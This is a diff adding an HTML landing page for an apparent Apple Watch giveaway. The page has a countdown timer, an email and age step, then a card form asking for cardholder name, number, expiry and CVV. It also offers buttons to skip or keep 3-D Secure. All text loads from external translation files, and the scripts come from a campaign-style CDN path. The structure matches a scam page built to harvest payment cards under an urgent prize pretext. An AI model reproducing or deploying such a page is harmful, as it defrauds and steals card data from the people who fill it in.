@@ -1,0 +1,218 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Watch</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/css/bootstrap-grid.min.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/css/aos.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/css/styles.css"
+    />
+  </head>
+
+  <body>
+<input type="hidden" value="UNIQUE_SESSION_ID" id="session">
+    <div class="header">
+      <div class="timer-container">
+        <div class="progress-bar">
+          <div class="bar positive">
+            <div class="bar-text">
+              <span class="tl_offerExpires"></span
+              ><span class="count-min"></span><span> : </span
+              ><span class="count"></span>
+            </div>
+          </div>
+          <div class="bar negative">
+            <div class="bar-text">
+              <span class="tl_offerExpires"></span
+              ><span class="count-min"></span><span> : </span
+              ><span class="count"></span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <p class="tl_win-new"></p>
+      <p class="tl_apple-watch"></p>
+      <span class="series-top"><p class="tl_series"></p></span>
+    </div>
+
+    <div class="section-top">
+      <div class="clock-img-wrapper">
+        <img
+          src="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/img/watch-pulse.png"
+        />
+      </div>
+      <div class="form-container">
+        <div class="price-circle-bg">
+          <div class="price-circle">
+            <p class="tl_currency"></p>
+          </div>
+        </div>
+        <div id="step1">
+          <div class="payment">
+            <p class="tl_hurry"></p>
+            <p class="payment-title tl_title"></p>
+            <form id="userDataForm">
+              <input type="text" id="email" placeholder="email address" />
+              <button type="submit" id="submit-btn" class="button-1"></button>
+              <div class="agreement">
+                <input type="checkbox" id="age" />
+                <label for="age" class="tl_age"></label>
+              </div>
+            </form>
+          </div>
+        </div>
+        <div class="payment" id="step2" style="display: none">
+          <p class="payment-title tl_paymentOf"></p>
+          <div class="cards">
+            <img
+              src="https://1607929107.rsc.cdn77.org/cam/CC/resources/img/visa.png"
+            />
+            <img
+              src="https://1607929107.rsc.cdn77.org/cam/CC/resources/img/master.png"
+            />
+            <img
+              src="https://1607929107.rsc.cdn77.org/cam/CC/resources/img/verified-by-visa.png"
+            />
+            <img
+              src="https://1607929107.rsc.cdn77.org/cam/CC/resources/img/mastercard.png"
+            />
+          </div>
+          <form id="cardDataForm">
+            <input type="text" id="cardOwner" />
+            <input type="text" id="cardNumber" />
+            <div class="flex-details">
+              <div class="flex-detail">
+                <label
+                  for="cardMonthExpiration"
+                  class="month-expiration"
+                ></label>
+                <select id="cardMonthExpiration"></select>
+              </div>
+              <div class="flex-detail">
+                <label for="cardYearExpiration" class="year-expiration"></label>
+                <select id="cardYearExpiration"></select>
+              </div>
+            </div>
+            <div class="flex-cvv">
+              <div class="flex-details">
+                <div class="flex-detail">
+                  <label class="cvv" for="cvv"></label>
+                  <input type="text" id="cvv" />
+                </div>
+              </div>
+            </div>
+
+            <button type="submit" id="pay-btn" class="button-1"></button>
+          </form>
+        </div>
+
+        <div class="form-end form-success" id="step3" style="display: none">
+          <span class="tl_msgTitle"></span><br />
+          <span class="tl_msgText"></span>
+        </div>
+        <div class="form-end form-failure" id="step4" style="display: none">
+          <span class="tl_msgTitle"></span><br />
+          <span class="tl_msgText"></span>
+        </div>
+        <div class="form-end form-failure" id="step5" style="display: none">
+          <span class="tl_msgTitle"></span><br />
+          <button id="skipSecure"></button>
+          <button id="dontSkipSecure"></button>
+        </div>
+        <div class="form-end form-success" id="step6" style="display: none">
+          <span class="tl_msgTitle"></span><br />
+          <span class="tl_msgText"></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="section-mid">
+      <div class="img-wrapper" data-aos="fade-right">
+        <img
+          src="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/img/apple-watch.png"
+          alt="apple watch"
+        />
+        <p class="series-btm tl_series"></p>
+      </div>
+      <div class="mid-texts">
+        <p class="mid-texts-title tl_mid-texts-title" data-aos="fade-left"></p>
+        <p class="mid-texts-text tl_mid-texts-text" data-aos="fade-right"></p>
+      </div>
+      <div class="desc-section">
+        <p class="tl_desc-title" data-aos="fade-up"></p>
+        <div class="desc-top-row">
+          <div class="desc-col" data-aos="fade-right">
+            <p class="desc-col-title tl_measure"></p>
+            <div class="desc-img-wrapper">
+              <img
+                src="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/img/watch1.png"
+                alt="Apple Watch"
+              />
+            </div>
+          </div>
+          <div class="desc-col" data-aos="fade-left">
+            <p class="desc-col-title tl_check"></p>
+            <div class="desc-img-wrapper">
+              <img
+                src="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/img/watch2.png"
+                alt="Apple Watch"
+              />
+            </div>
+          </div>
+        </div>
+        <div class="desc-btm-row">
+          <div class="desc-col" data-aos="fade-right">
+            <p class="desc-col-title tl_track"></p>
+            <div class="desc-img-wrapper">
+              <img
+                src="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/img/activities.png"
+                alt="Apple Watch"
+              />
+            </div>
+          </div>
+          <div class="desc-col" data-aos="fade-left">
+            <p class="desc-col-title tl_meet"></p>
+            <div class="desc-img-wrapper">
+              <img
+                src="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/img/watch3.png"
+                alt="Apple Watch"
+              />
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section-footer">
+      <footer class="footer"></footer>
+    </div>
+    <script>
+      var customTranslationFilesToLoad = [
+        "/cam/CC/GS/Apple_Watch_Hermes_band/translations/{lang}.json",
+      ];
+      var scrollOnMobileTimeout = 4000;
+    </script>
+    <script src="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/js/aos.js"></script>
+    <script>
+      AOS.init();
+    </script>
+    <script src="https://1607929107.rsc.cdn77.org/cam/CC/GS/Apple_Watch_Hermes_band/js/main.js"></script>
+    <script src="//1607929107.rsc.cdn77.org/ci/cc_tl_script/script.js"></script>
+    <script src="//1607929107.rsc.cdn77.org/ci/cc_script/main.js"></script>
+    <script src="/push.js" crossorigin="anonymous"></script>
+  </body>
+</html>
